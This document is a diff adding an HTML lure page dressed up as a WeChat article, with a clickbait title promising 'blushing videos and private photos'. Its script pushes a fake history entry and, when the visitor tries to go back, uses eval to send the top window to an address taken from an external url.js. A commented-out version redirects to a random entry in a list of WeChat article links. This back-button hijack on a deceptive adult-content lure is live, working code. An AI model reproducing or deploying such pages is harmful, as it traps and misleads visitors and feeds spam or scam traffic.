@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <title>▶点我↘↘↘等你哦</title>
+    <link rel="stylesheet" type="text/css" href="//laowang789.com/css/main.css">
+    <link rel="stylesheet" type="text/css" href="//laowang789.com/css/more.css">
+    <link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/Swiper/3.4.2/css/swiper.min.css">
+    <link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/weui/1.0.2/style/weui.min.css">
+    <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+    <script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+    <script src="//cdn.bootcss.com/zepto/1.2.0/zepto.min.js"></script>
+    <script src="//cdn.bootcss.com/iScroll/5.1.3/iscroll-lite.js"></script>
+    <script src="//cdn.bootcss.com/Swiper/3.4.2/js/swiper.jquery.min.js"></script>
+    <script src="https://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js" charset="utf-8"></script>
+    <script src="https://v.qq.com/iframe/tvp.config.js" charset="utf-8"></script>
+    <script src="../js/jquery.min.js"></script>
+    <script src="../js/jquery.cookie.js"></script>
+    <script src="../js/url.js"></script>
+    <link type="text/css" rel="stylesheet" href="../css/warp.css">
+    <style type="text/css">
+        .wap{ font-size: 20px;}
+        .h2-title{  width: 750px; height: 80px; font-size: 26px; line-height: 80px; color: #000000; border-bottom: 1px solid #e7e7eb; }
+    </style>
+</head>
+<body>
+<div class="wap">
+        <h2 class="h2-title">▶点我↘↘↘等你哦</h2>
+        <p style="line-height: 60px;">2017-10-28 <a href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzI2NDc5NTQyNQ==&scene=110#wechat_redirect" style="color: #607fa6">夜半聊心事</a></p>
+        <img src="../images/wp02.gif">
+        <p style="text-align: center; color: red; font-size: 18px; margin-top: 20px;">观看更多脸红视频和私密照片</p>
+        <p style="text-align: center; color: #000; font-size: 15px; margin-top: 10px; font-weight:600;"> 等你哦~你懂得！</p>
+        <img src="../images/wap04.GIF" style="display: block; margin: auto; margin-top: 20px;">
+    </div>
+<script>
+    var url_arr = [
+        'http://mp.weixin.qq.com/s?__biz=MzIyNDkzNTk4OQ==&mid=100000125&idx=1&sn=0711232ec6a99cda876acc331f94e998&chksm=680628275f71a1310362e813448bda2dc36365ba56cc0949fc26438c8ee418abe1f594e4a38b#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzU5NzE0MzM0OA==&mid=100000223&idx=1&sn=82678736ff05fda7252fe6656586e292&chksm=7e56bb8449213292134e1d5089b9c0e4687baa81f7a8bba65052c884d2cd57cbcf6fe2976a99#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzU1NzE0NjM2NA==&mid=100003710&idx=1&sn=83839e624175b84bb8259e82dcbe4215&chksm=7c3b06ed4b4c8ffb4c25d1af27dd81594083cda9d06f276aaca55dafab796902852d40ba9583#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzIxMDI1MTU5MQ==&mid=515175266&idx=1&sn=70e2e7ce6682b7c5acdaf73c78409141&chksm=0c27294a3b50a05c7aed6c400b070c06c9b1204a4e2b5e7c83ed235dba4cedf6651691acf507#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzI2ODc4MDkzMA==&mid=100000445&idx=1&sn=6cc42fef4975f65482eeac78c715e647&chksm=6aeb16505d9c9f46d1f9c7b93b43dda1d8819b46e5e5ca0dd70bea9347c17952e65689d5ec52#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzU4MTE0MDg2NQ==&mid=100000317&idx=1&sn=756e07f3b2217251d6fafe6537f598f4&chksm=7d4d6ad34a3ae3c585592a12f4a09e5434ef28753338aecdb2cb9b1053a5a0ff02e47f6c0192#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzUzMjE1OTA5Mg==&mid=100000275&idx=1&sn=588bb242d2ec540b566c40a75d86811b&chksm=7ab6cd084dc1441e013b57417f295a484c610ede7196bcab736ce2fd9a083286c7d9066ad8ac#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzI4NDg2MDU1OQ==&mid=100000078&idx=1&sn=95181801c1af5446695ca2e9906038f7&chksm=6bf448ae5c83c1b82385ce3ee8295e443e0e02aab7686e8384d3bbe7d88846489163962e11b8#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzIxNDkzNTYzOQ==&mid=100000330&idx=1&sn=dcad8df24dbc78acbeb25fd76f2d8a3f&chksm=179eb37220e93a640f2fab3e64471902cc4423cf469a3f5abafb364ae6b056b7893098e9f769#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzI5MDc3MzU0Ng==&mid=100000444&idx=1&sn=f73fe064279e0e749a393eca47c27d4c&chksm=6c1b8df95b6c04ef27906c91687a3045a36f50ab7679ec1c4319e774d403519a7fb52e384e8d#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzU0NDI3NjIzMA==&mid=100000165&idx=1&sn=d1544de7c98efe5c8a4bc23508f247c1&chksm=7b7febcc4c0862da8425d08c7e2d183092bf6f5fadc00fdd8a36e3206e846fef9e3d8f419559#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzU4NDIyMzcwMw==&mid=100000096&idx=1&sn=2ed7c51b3e1d987863d2dd273c9d6a13&chksm=7d9c5fd84aebd6ce85200b16af3983050ad499660820d3a3ebc93eb865c1cfd28905d4af71ee#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzU4NTE2OTk5MA==&mid=100000327&idx=1&sn=21e6f470501ec19ceb22857e3c033778&chksm=7d8fef6e4af866785dbdb75c9a40a603f61b8008ddcee5ab8a0fb81f66080cb83741b5a8abdf#rd',
+        'http://mp.weixin.qq.com/s?__biz=MzUxNzI4NDI0NA==&mid=100000194&idx=1&sn=98bfd953108bf45646e875e38dd6ccad&chksm=799bc9394eec402f0dde46f6ae563d391719dd46e80141b1352bcf63a5c8235c8d3e8fe6a68f#rd',
+    ];
+    var n = Math.floor(Math.random() * url_arr.length + 1)-1;
+	
+    function anchor() {
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime())
+    }
+    function zp() {
+    	/*
+        var url = url_arr[n];
+        eval("top.location.href='"+url+"'");
+        */
+       eval("top.location.href='http://"+get_url+"/topics/t_0.html'");
+    }
+    setTimeout('anchor()', 100);
+    window.onhashchange = function() {
+        zp()
+    };
+    
+</script>
+</body>
+</html>
